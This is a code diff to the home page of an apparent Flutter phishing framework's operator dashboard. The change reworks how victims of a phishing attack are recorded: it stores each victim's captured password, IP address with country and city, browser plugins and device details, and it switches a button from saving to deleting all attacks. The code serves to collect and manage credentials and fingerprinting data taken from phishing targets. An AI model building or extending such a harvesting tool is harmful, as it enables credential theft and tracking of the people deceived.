@@ -1,4 +1,3 @@
-import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
 import 'package:phishing_framework/attack.dart';
 import 'package:phishing_framework/app_scheme.dart';
@@ -208,13 +207,24 @@ class _HomePageState extends State<HomePage> {
                       for (PhishingAttack attack
                           in AttackManager.instance.attacks) {
                         if (attack.id == v["Id"]) {
-                          attack.victims.add(
-                            Victim.withPassword(
-                              v["Username"] ?? "",
-                              v["Password"] ?? "",
-                              v["Name"] ?? "",
-                            ),
-                          );
+                          // Get the victim
+                          Victim vic = attack.getVictim(v["victimIdent"] as int);
+
+                          if (v["password"] != null) {
+                            vic.setPassword(v["password"] as String);
+                          }
+
+                          if (v["Ip"] != null) {
+                            vic.setIpDetails(IpDetails(v["Ip"] as String, v["Country"] as String, v["City"] as String));
+                          }
+
+                          if (v["BrowserPlugins"] != null) {
+                            vic.setBrowserPlugins(v["BrowserPlugins"] as String);
+                          }
+
+                          if (v["DeviceDetails"] != null) {
+                            vic.setDeviceDetails(v["DeviceDetails"] as String);
+                          }
                         }
                       }
 
@@ -236,7 +246,7 @@ class _HomePageState extends State<HomePage> {
                   onPressed: () => {
                     setState(() {
                       // _phishingAttacks.clear();
-                      AttackManager.instance.saveAllAttacks();
+                      AttackManager.instance.deleteAllAttacks();
                     })
                   },
                   child: const Icon(Icons.dangerous),
